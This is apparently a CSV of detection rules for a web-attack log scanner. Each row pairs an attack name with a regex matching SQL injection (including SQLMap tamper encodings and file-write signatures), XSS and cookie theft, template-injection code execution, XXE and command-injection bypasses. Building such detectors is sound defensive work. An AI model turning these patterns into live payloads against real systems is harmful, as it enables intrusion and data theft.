attack_name,attack_query
[SQL INJECTION] SQL statement keywords detected,(SELECT|FROM(\+|%20)dual|INSERT|UPDATE|DROP|COLLATE|CASE|SUBSTR|SUBSTRING|NULL|ORDER(\+|%20)BY|UNION(\+|%20)(ALL)?).+(--(\+|%20)|%23)?
[SQL INJECTION] Database enumeration,v$version|v$instance|@@version|version\(\)|all_tables|all_tab_columns|information_schema.tables|information_schema.columns
[SQL INJECTION] Time delay attack,pg_sleep|sleep|dbms_pipe\.receive_message|WAITFOR(\+|%20)DELAY
[SQL INJECTION] Popular conditional error method detection,1\/0
[SQL INJECTION] Popular SQL Functions keywords detected,ASCII|CONCAT|CHAR|HEX
[SQL INJECTION] Bypass techniques (non-whitespace) detected,\/\*.*?\*\/|%0b
[SQL INJECTION] Single-encoded keywords detected,(%53%45%4C%45%43%54|%49%4E%53%45%52%54|%55%50%44%41%54%45|%44%45%4C%45%54%45|%43%4F%4C%4C%41%54%45|%43%41%53%45|%53%55%42%53%54%52|%53%55%42%53%54%52%49%4E%47|%4E%55%4C%4C|%4F%52%44%45%52%20%42%59|%55%4E%49%4F%4E|%55%4E%49%4F%4E%20%41%4C%4C|%46%52%4F%4D%20%64%75%61%6C)
[SQL INJECTION] Double-encoded keywords detected,(%2553%2545%254C%2545%2543%2554|%2549%254E%2553%2545%2552%2554|%2555%2550%2544%2541%2554%2545|%2544%2545%254C%2545%2554%2545|%2543%254F%254C%254C%2541%2554%2545|%2543%2541%2553%2545|%2553%2555%2542%2553%2554%2552|%2553%2555%2542%2553%2554%2552%2549%254E%2547|%254E%2555%254C%254C|%254F%2552%2544%2545%2552%2520%2542%2559|%2555%254E%2549%254F%254E|%2555%254E%2549%254F%254E%2520%2541%254C%254C|%2546%2552%254F%254D%2520%2564%2575%2561%256C)
[SQL INJECTION] Unicode-encoded keywords detected,(%u0053%u0045%u004C%u0045%u0043%u0054|%u0049%u004E%u0053%u0045%u0052%u0054|%u0055%u0050%u0044%u0041%u0054%u0045|%u0044%u0045%u004C%u0045%u0054%u0045|%u0043%u004F%u004C%u004C%u0041%u0054%u0045|%u0043%u0041%u0053%u0045|%u0053%u0055%u0042%u0053%u0054%u0052|%u0053%u0055%u0042%u0053%u0054%u0052%u0049%u004E%u0047|%u004E%u0055%u004C%u004C|%u004F%u0052%u0044%u0045%u0052%u0020%u0042%u0059|%u0055%u004E%u0049%u004F%u004E|%u0055%u004E%u0049%u004F%u004E%u0020%u0041%u004C%u004C|%u0046%u0052%u004F%u004D%u0020%u0064%u0075%u0061%u006C)
[SQL INJECTION] Char unicode escape (SQLMap tamper script) detected,(%5Cu0053%5Cu0045%5Cu004C%5Cu0045%5Cu0043%5Cu0054|%5Cu0049%5Cu004E%5Cu0053%5Cu0045%5Cu0052%5Cu0054|%5Cu0055%5Cu0050%5Cu0044%5Cu0041%5Cu0054%5Cu0045|%5Cu0044%5Cu0045%5Cu004C%5Cu0045%5Cu0054%5Cu0045|%5Cu0043%5Cu004F%5Cu004C%5Cu004C%5Cu0041%5Cu0054%5Cu0045|%5Cu0043%5Cu0041%5Cu0053%5Cu0045|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052|%5Cu0053%5Cu0055%5Cu0042%5Cu0053%5Cu0054%5Cu0052%5Cu0049%5Cu004E%5Cu0047|%5Cu004E%5Cu0055%5Cu004C%5Cu004C|%5Cu004F%5Cu0052%5Cu0044%5Cu0045%5Cu0052%5Cu0020%5Cu0042%5Cu0059|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E|%5Cu0055%5Cu004E%5Cu0049%5Cu004F%5Cu004E%5Cu0020%5Cu0041%5Cu004C%5Cu004C|%5Cu0046%5Cu0052%5Cu004F%5Cu004D%5Cu0020%5Cu0064%5Cu0075%5Cu0061%5Cu006C)
[SQL INJECTION] Overlong UTF8 (SQLMap tamper script) detected,(%C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94|%C1%89%C1%8E%C1%93%C1%85%C1%92%C1%94|%C1%95%C1%90%C1%84%C1%81%C1%94%C1%85|%C1%84%C1%85%C1%8C%C1%85%C1%94%C1%85|%C1%83%C1%8F%C1%8C%C1%8C%C1%81%C1%94%C1%85|%C1%83%C1%81%C1%93%C1%85|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92|%C1%93%C1%95%C1%82%C1%93%C1%94%C1%92%C1%89%C1%8E%C1%87|%C1%8E%C1%95%C1%8C%C1%8C|%C1%8F%C1%92%C1%84%C1%85%C1%92%C0%A0%C1%82%C1%99|%C1%95%C1%8E%C1%89%C1%8F%C1%8E|%C1%95%C1%8E%C1%89%C1%8F%C1%8E%C0%A0%C1%81%C1%8C%C1%8C|%C1%86%C1%92%C1%8F%C1%8D%C0%A0%C1%A4%C1%B5%C1%A1%C1%AC)
[SQL INJECTION] SQLMap --os-shell signatures,(INTO%20OUTFILE|INTO%20DUMPFILE|LOAD_FILE)
[XSS] Testing for vuln,(javascript:)?alert\(
[XSS] Frequently seen tags,%3C(script|iframe|img%20src)
[XSS] Frequently seen event handlers,onactivate|onafterscriptexecute|onanimationcancel|onanimationend|onanimationiteration|onbeforeactivate|onbeforedeactivate|onbeforeprint|onbeforescriptexecute|onbeforeunload|onbegin|onblur|onbounce|oncanplay|oncanplaythrough|oncuechange|ondeactivate|ondurationchange|onend|onended|onerror|onfinish|onfocus|onfocusin|onfocusout|onhashchange|onload|onloadeddata|onloadedmetadata|onloadend|onloadstart|onmessage|onpageshow|onplay|onplaying|onpopstate|onprogress|onreadystatechange|onrepeat|onresize|onscroll|onstart|ontimeupdate|ontoggle|ontransitioncancel|ontransitionend|ontransitionrun|ontransitionstart|onunhandledrejection|onunload|onwaiting|onwebkitanimationend|onwebkitanimationiteration|onwebkitanimationstart|onwebkittransitionend|onafterprint|onauxclick|onbeforecopy|onbeforecut|onbeforepaste|onchange|onclick|onclose|oncontextmenu|oncopy|oncut|ondblclick|ondrag|ondragend|ondragenter|ondragleave|ondragover|ondragstart|ondrop|onfullscreenchange|oninput|oninvalid|onkeydown|onkeypress|onkeyup|onmousedown|onmouseenter|onmouseleave|onmousemove|onmouseout|onmouseover|onmouseup|onmousewheel|onmozfullscreenchange|onpagehide|onpaste|onpause|onpointerdown|onpointerenter|onpointerleave|onpointermove|onpointerout|onpointerover|onpointerrawupdate|onpointerup|onreset|onsearch|onseeked|onseeking|onselect|onselectionchange|onselectstart|onshow|onsubmit|ontouchend|ontouchmove|ontouchstart|onvolumechange|onwheel
[XSS] Cookie theft,document\.cookie
[SSTI] Common fuzzing technique,(%7B|%24|%23|%3C%25%3D)+(\+|%20)?\d+(\+|%20)?\*(\+|%20)?\d+(\+|%20)?(%25%3E|%7D)+
[SSTI] Twig Template Version enumeration,%7B%7Bconstant%28%27+Twig_Environment%3A%3AVERSION+%27%29%7D%7D
[SSTI] Twig Template Code Execution,registerUndefinedFilterCallback.+exec|system
[SSTI] Twig Template Remote File Include Code Execution,setCache\(.+\).+loadTemplate\(.+\)
[SSTI] Freemaker Template Code Execution,freemarker\.template\.utility\.Execute
[SSTI] Velocity/Pebble/Thymeleaf Template Code Execution,getRuntime%28%29\.exec
[SSTI] Smarty Template Read File,getStreamVariable%28.+%29
[SSTI] Smarty Template Write File,Smarty_Internal_Write_File%3A%3AwriteFile
[SSTI] Pebble (New version) Template Code Execution,forName%28%27java.lang.Runtime%27%29(\n|.)+\.exec
[SSTI] Jade Template Code Execution,var%20(.+)%20?=(\n|.)+\1\.exec
[SSTI] PugJS Template Code Execution,localLoad%28%22child_process%22%29.exec
[SSTI] Nunjucks Template Code Execution,require%28%27child_process%27%29.execSync
[SSTI] Tornado Template Code Execution,import%20os%20(\n|.)+os\.system
[SSTI] Razor Template Code Execution,System\.Diagnostics\.Process\.Start
[SSTI] ASP Template Code Execution,CreateObject%28%22Wscript\.Shell%22%29\.exec
[XXE] External entity attack,ENTITY.+SYSTEM
[XXE] XInclude attack,XInclude.+xi.+include
[XXE] Billion Laugh Attack (DoS),ENTITY%20(.+)%20.+\n.*&\1
[XXE] YAML attack (DoS),&(.+).+\n.+\*\1
[COMMAND INJECTION] Inline Command Execution,(\$\()(.*)(\))|(%24%28)(.*)(%29)|`(.*)`|(%60)(.*)(%60)
[COMMAND INJECTION] IFS Space Bypass ,(\$IFS)|(\${IFS})|(IFS=)|(%24IFS)|(%24%7BIFS%7D)|(IFS%3D)
[COMMAND INJECTION] Uninitialised Variable Bypass,(\$u)|(%24u)|(\${u})|(%24%7Bu%7D)
[COMMAND INJECTION] Command Chaining,(%3B)|(&&)|(%26)|(%26%26)|\||(\|\|)|(%7C)|(%7C%7C)
